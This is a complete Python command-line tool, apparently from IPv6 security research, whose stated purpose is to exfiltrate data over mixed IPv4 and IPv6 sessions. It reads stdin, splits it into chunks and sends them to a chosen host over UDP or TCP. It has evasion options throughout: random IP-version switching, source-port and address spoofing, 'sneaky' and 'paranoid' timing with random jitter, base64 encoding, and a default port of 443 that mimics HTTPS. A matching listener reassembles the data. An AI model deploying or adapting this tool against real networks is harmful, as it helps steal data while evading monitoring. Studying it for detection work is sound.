#!/usr/bin/python3 -tt
# -*- coding: utf-8 -*-
#
# (C) 2015 Bernhards 'Lockout' Blumbergs
# See LICENSE file for usage conditions
#
# Known issues:
# 1. TCP socket reuse problems once the socket has been closed
# 2. UDP socket spoofing, port reuse problems
# 3. Keepalive does not print out the previous buffer befoe new one is received
# 4. When sending UDP datagrams as fast as possible they do not arrive at the
# destination (of course). If file is being reassembled, EOF is not received
# 5. Performance degradation when hashing is used (of course)
#
# To be implemented:
# 1. Payload XOR encryption with a shared key
# 2. SSL signing and handshake for SSH, HTTPS traffic spoofing
# 3. Custom SSL certificate provision
# 4. Logging instead of printing verbose messages on the screen
# 5. Multiple IPv6 destination addresses as list for random selection
__version__ = "0.72/Devon"

import socket
import sys
import argparse
import base64
import random
import signal
from os import urandom
from time import sleep, time
from math import ceil
from hashlib import md5


def signal_handler(signal, frame):
    sys.exit(0)


def hashsum(data):
    """
    Calculates the exfiltrated data MD5 hash sum
    """
    global hash_sum
    if data:
        data_hash = int(md5(data).hexdigest(), 16)
        hash_sum += data_hash


def send64(data, mode):
    """
    Send the specified data to the destination socket
    over IPv6 and IPv4 interchangeably
    """
    global data_sent
    version = ip_version(args.ip_version_select)

    if version == 4:
        host = args.host4
    if version == 6:
        host = args.host6

    if not args.udp and not args.tcp:
        if args.verbose >= 2:
            print("[+] Defaulting to UDP protocol")
        args.udp = True

    if args.udp:
        if version == 4:
            sock = socket.socket(
                socket.AF_INET,             # IPv4
                socket.SOCK_DGRAM)          # UDP socket
        if version == 6:
            sock = socket.socket(
                socket.AF_INET6,            # IPv6
                socket.SOCK_DGRAM)          # UDP socket

        socket.SO_BINDTODEVICE = 25         # If not specified by the system

        sock.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_BINDTODEVICE,
            args.interface.encode())

        SourcePort = None
        IPaddress = None
        if args.source_port:                    # Set UDP source IP:port
            SourcePort = args.source_port
        if args.randomize_source_port:
            SourcePort = random.randint(1024, 65535)
        if args.source_ip4 and version == 4:
            IPaddress = args.source_ip4
        if args.source_ip6 and version == 6:
            IPaddress = args.source_ip6

        if SourcePort and not IPaddress:        # TODO: Binding problems!
            sock.bind(('', SourcePort))         # Currently works only
        if IPaddress and not SourcePort:        # for ports and not IPs
            sock.bind((IPaddress))
        if IPaddress and SourcePort:
            sock.bind((IPaddress, SourcePort))

        if args.verbose >= 1:
            print(
                "[*] IPv{0} UDP socket to"
                " {1}:{2} via {3}".format(
                    version, host, port, args.interface)
                )

        if args.hashing:                        # Calculate hash before b64
            hashsum(data)
            if args.verbose >= 2:
                print(
                    "[+] Exfiltrated data block hash sum: {0}".format(
                        hex(hash_sum))
                    )

        if args.base64:
            data = base64.b64encode(data)
            if args.verbose >= 3:
                print(
                    "[D] Base64 decoded data {0} bytes:\n{1}".format(
                        len(base64.b64decode(data)), base64.b64decode(data))
                    )

        sock.sendto(data, (host, port))     # Send UDP datagram
        data_sent += len(data)
        if args.verbose >= 3:
            print(
                "[D] Buffer {0} bytes sent:\n{1}".format(
                    len(data), data)
                )

        sock.close()
        return(True)                        # Send success

    if args.tcp:
        if version == 4:
            sock = socket.socket(
                socket.AF_INET,             # IPv4
                socket.SOCK_STREAM)         # TCP socket
        if version == 6:
            sock = socket.socket(
                socket.AF_INET6,            # IPv6
                socket.SOCK_STREAM)         # TCP socket

        socket.SO_BINDTODEVICE = 25         # If not specified by the system

        sock.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_BINDTODEVICE,
            args.interface.encode())

        try:
            if args.source_port:                    # Set TCP source port
                sock.bind(('', args.source_port))   # TODO: Set source IPv4/6
        except OSError as error:                    # TODO: TCP socket reuse
            if args.verbose >= 3:
                print("[!] {0}".format(error))
            sock.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1)
            # sock.bind(('', args.source_port))

        if args.verbose >= 1:
            print(
                "[*] IPv{0} Connecting to TCP"
                " socket {1}:{2} via {3}".format(
                    version, host, port, args.interface)
                )

        sock.connect((host, port))
        if args.verbose >= 1:
            print("[*] TCP socket connected")

        if args.hashing:                    # Calculate hash before b64
            hashsum(data)
            if args.verbose >= 2:
                print(
                    "[+] Exfiltrated data block hash sum: {0}".format(
                        hex(hash_sum))
                    )

        if args.base64:
            data = base64.b64encode(data)
            if args.verbose >= 3:
                print(
                    "[D] Base64 decoded data {0} bytes:\n{1}".format(
                        len(base64.b64decode(data)), base64.b64decode(data))
                    )

        sock.send(data)                        # Send TCP stream
        data_sent += len(data)
        if args.verbose >= 3:
            print(
                "[D] Buffer {0} bytes sent:\n{1}".format(
                    len(data), data)
                )

        sock.close()
        return(True)                            # Send success


def ip_version(sel_type):
    """
    IP version selection algorithms
    """
    random.seed(a=urandom(100))                 # Initialize seed urandom
    if sel_type == 0:                           # Random odd selection
        r = random.randint(1, 100)
        if r % 2 == 0:
            version = 6
        else:
            version = 4
    elif sel_type == 1:                         # Random selection
        version = random.sample([4, 6], 1)[0]
    elif sel_type == 2:
        version = random.choice([4, 6])
    elif sel_type == 3:
        if random.random() >= 0.5:
            version = 6
        else:
            version = 4
    elif sel_type == 4:                         # IPv4 only
        version = 4
        ipv4_only = True
    elif sel_type == 6:                         # IPv6 only
        version = 6
        ipv6_only = True

    global ip6_sessions_total                   # Session tracking
    global ip4_sessions_total
    global ip6_sessions
    global ip4_sessions
    if version == 6:
        ip6_sessions += 1
        ip6_sessions_total += 1
    if version == 4:
        ip4_sessions += 1
        ip4_sessions_total += 1

    if ip6_sessions > args.max_subsequent_sessions and not ipv6_only:
        version = 4
        ip6_sessions = 0
        ip4_sessions = 1
        ip6_sessions_total -= 1
        ip4_sessions_total += 1
        if args.verbose >= 2:
            print(
                "[+] Maximum number of subsequent {0}"
                " IPv6 sessios reached".format(
                    args.max_subsequent_sessions)
                )
    if ip4_sessions > args.max_subsequent_sessions and not ipv4_only:
        version = 6
        ip4_sessions = 0
        ip6_sessions = 1
        ip4_sessions_total -= 1
        ip6_sessions_total += 1
        if args.verbose >= 2:
            print(
                "[+] Maximum number of subsequent {0}"
                " IPv4 sessios reached".format(
                    args.max_subsequent_sessions)
                )

    return(version)


def wait():
    """
    Session timing (seconds)
    """
    if args.timing_set == -1:
        if args.timing == 0:
            sleep_time = 0.15                   # Insane
            if args.verbose >= 2:
                print("[+] Insane send at {0}s".format(sleep_time))
        elif args.timing == 1:
            sleep_time = 3                      # Agressive
            if args.verbose >= 2:
                print("[+] Agressive send at {0}s".format(sleep_time))
        elif args.timing == 2:
            sleep_time = 15                     # Polite
            if args.verbose >= 2:
                print("[+] Polite send at {0}s".format(sleep_time))
        elif args.timing == 3:
            sleep_time = 30                     # Sneaky
            if args.verbose >= 2:
                print("[+] Sneaky send at {0}s".format(sleep_time))
        elif args.timing >= 4:
            sleep_time = 300                    # Paranoid
            if args.verbose >= 2:
                print("[+] Paranoid send at {0}s".format(sleep_time))
    if args.timing_set >= 0:                    # Custom timing
        sleep_time = args.timing_set
        if args.verbose >= 2:
            print(
                "[+] Custom interval timing of {0}s".format(
                    sleep_time)
                )
    if args.timing_randomize:
        sleep_time = sleep_time + random.uniform(-0.4, 0.4) * sleep_time
        if args.verbose >= 2:
            print(
                "[+] Session interval randomized to {0}s".format(
                    sleep_time)
                )
    sleep(sleep_time)
    return(True)

# Command line option parser
parser = argparse.ArgumentParser(
    description="Exfiltrate data over dual-stack IPv4 and IPv6 sessions",
    )

parser.add_argument(
    '-t', '--tcp',
    action="store_true",
    help="Use TCP")

parser.add_argument(
    '-u', '--udp',
    action="store_true",
    help="Use UDP. Default: udp")

parser.add_argument(
    '-l', '--listen',
    action="store_true",
    help="Listen (server) mode. Default: send (client)")

parser.add_argument(
    '-b64', '--base64',
    action="store_true",
    help="Base64 encode/decode the payload")

parser.add_argument(
    '-b', '--buffer',
    type=int,
    default=500,
    help="Buffer size. Default: 500")

parser.add_argument(
    '-h4', '--host4',
    type=str,
    default="127.0.0.1",
    help="Host IPv4 address. Default: 127.0.0.1")

parser.add_argument(
    '-h6', '--host6',
    type=str,
    default="::1",
    help="Host IPv6 address. Default: ::1")

parser.add_argument(
    '-p', '--port',
    type=int,
    default=443,
    help="Destination or listen port. Default: 443")

parser.add_argument(
    '-i', '--interface',
    type=str,
    default="eth0",
    help="Network interface. Default: eth0")

parser.add_argument(
    '-v', '--verbose',
    action="count",
    default=0,
    help="Increase verbosity")

parser.add_argument(
    '--show_stat',
    action="store_true",
    help="Show exfiltration statistics. On if verbosity used")

parser.add_argument(
    '-T', '--timing',
    type=int,
    default=1,
    help="Session delay timing level 0-4. Default: 1")

parser.add_argument(                            # TODO: Implement TCP
    '-sp', '--source_port',                     # source port
    type=int,
    help="Specify source port. UDP only")

parser.add_argument(
    '--randomize_source_port',
    action="store_true",
    help="Randomize source port. Default:1024-65535")

parser.add_argument(
    '-sip4', '--source_ip4',
    type=str,
    help="Specify source IPv4. UDP only")

parser.add_argument(
    '-sip6', '--source_ip6',
    type=str,
    help="Specify source IPv6. UDP only")

parser.add_argument(
    '-k', '--keepalive',
    action="store_true",
    help="Keep the listener alive. Default: False")

parser.add_argument(
    '--timing_randomize',
    action="store_true",
    help="Randomize session delay timing. Default: False")

parser.add_argument(
    '--timing_set',
    type=int,
    default=-1,
    help="Set custom timing. Default: Disabled")

parser.add_argument(
    '--ip_version_select',
    type=int,
    default=0,
    help="Choose random IP version selection approach")

parser.add_argument(
    '--max_subsequent_sessions',
    type=int,
    default=3,
    help="Maxmimum number of subsequent sessions of same IP version."
    " Default: 3")

parser.add_argument(
    '--hashing',
    action="store_true",
    help="calculate exfiltrated data hash sum. Default: False")

parser.add_argument(
    '-V', '--version',
    action="store_true",
    help="Print program version and exit")

args = parser.parse_args()

if args.version:
    print("Version: ", __version__)
    sys.exit(0)

# Program variables
buffer_size = args.buffer
host4 = args.host4
host6 = args.host6
port = args.port
ip6_sessions = 0
ip4_sessions = 0
ip6_sessions_total = 0
ip4_sessions_total = 0
data_sent = 0
hash_sum = 0x0


# Main routine
# Client mode
if not args.listen:
    if args.verbose >= 1:
        print("[*] Client mode")

    start_time = time()
    buff = 0
    read_data = b""
    data = b""
    while True:
        read_data = sys.stdin.buffer.read(1)
        if not read_data:                       # End of input or EOF
            send64(data, 0)
            break
        data += read_data
        buff += 1
        if buff == buffer_size:
            send64(data, 0)
            wait()
            buff = 0
            data = b""

    send64(b"", 0)                              # End of transmission
    end_time = time()                           # Can be profiled?
    if args.verbose >= 1 or args.show_stat:
        print(
            "[*] SUMMARY: IPv4 sessions: {0}, IPv6 sessions: {1}, "
            "Total sessions: {2}, Data: {3}B, Time: {4: .2f}s".format(
                ip4_sessions_total, ip6_sessions_total,
                ip4_sessions_total + ip6_sessions_total,
                data_sent,
                end_time - start_time)
            )
        if args.hashing:
            print(
                "[+] Exfiltrated data hash sum: {0}".format(
                    hex(hash_sum))
                )

# Listen mode
if args.listen:
    signal.signal(signal.SIGINT, signal_handler)    # Terminate on Crl+C

    if args.verbose >= 1:
        print("[*] Listen mode")

    if args.base64:
        buffer_size = ceil(buffer_size * 1.5)    # Increase receive buffer size

    if not args.udp and not args.tcp:
        if args.verbose >= 2:
            print("[+] Defaulting to UDP protocol")
        args.udp = True

    if args.udp:
        sock64 = socket.socket(
            socket.AF_INET6,                    # IPv6
            socket.SOCK_DGRAM)                  # UDP

        socket.SO_BINDTODEVICE = 25             # If not specified by system

        sock64.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_BINDTODEVICE,
            args.interface.encode())

        sock64.bind(('::', port))               # Listen on both protocols

        if args.verbose >= 1:
            print(
                "[*] Listening on {0} IPv4:'{1}'"
                " IPv6:'{2}' port:{3} protocol:UDP".format(
                    args.interface, host4, host6, port)
                )

        while True:
            data64, addr64 = sock64.recvfrom(buffer_size)

            if data64:
                if args.verbose >= 2:
                    print("\n[+] Received from {0}".format(addr64))
                if args.base64:
                    if args.verbose >= 3:
                        print(
                            "\n[D] Base64 encoded data {0} bytes:\n{1}".format(
                                len(data64), data64)
                            )
                    data64 = base64.b64decode(data64)
                if args.hashing:
                    hashsum(data64)
                    if args.verbose >= 2:
                        print(
                            "\n[+] Data block hash sum: {0}".format(
                                hex(hash_sum))
                            )
                sys.stdout.buffer.write(data64)
            else:
                if args.keepalive:              # TODO: Fix data output!
                    continue                    # data not output to stderr
                else:
                    break

        sock64.close()

        if args.show_stat or args.verbose >= 1:
            if args.hashing:
                print(
                    "\n[+] Exfiltrated data hash sum: {0}".format(
                        hex(hash_sum))
                    )

    if args.tcp:
        sock64 = socket.socket(
            socket.AF_INET6,                    # IPv6
            socket.SOCK_STREAM)                 # TCP

        socket.SO_BINDTODEVICE = 25             # If not specified by system

        sock64.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_BINDTODEVICE,
            args.interface.encode())

        sock64.bind(('::', port))               # Listen on both protocols
        sock64.listen(1)

        if args.verbose >= 1:
            print(
                "[*] Listening on {0} IPv4:'{1}'"
                " IPv6:'{2}' port:{3} protocol:TCP".format(
                    args.interface, host4, host6, port)
                )

        while True:
            conn64, addr64 = sock64.accept()
            data64 = conn64.recv(buffer_size)

            if data64:
                if args.verbose >= 2:
                    print("\n[+] Received from {0}".format(addr64))

                if args.base64:
                    if args.verbose >= 3:
                        print(
                            "\n[D] Base64 encoded data {0} bytes:\n{1}".format(
                                len(data64), data64)
                            )
                    data64 = base64.b64decode(data64)
                if args.hashing:
                    hashsum(data64)
                    if args.verbose >= 2:
                        print(
                            "\n[+] Data block hash sum: {0}".format(
                                hex(hash_sum))
                            )

                sys.stdout.buffer.write(data64)
            else:
                if args.keepalive:              # TODO: Fix data output!
                    continue                    # data not output to stderr
                else:
                    break

        sock64.close()

        if args.show_stat or args.verbose >= 1:
            if args.hashing:
                print(
                    "\n[+] Exfiltrated data hash sum: {0}".format(
                        hex(hash_sum))
                    )
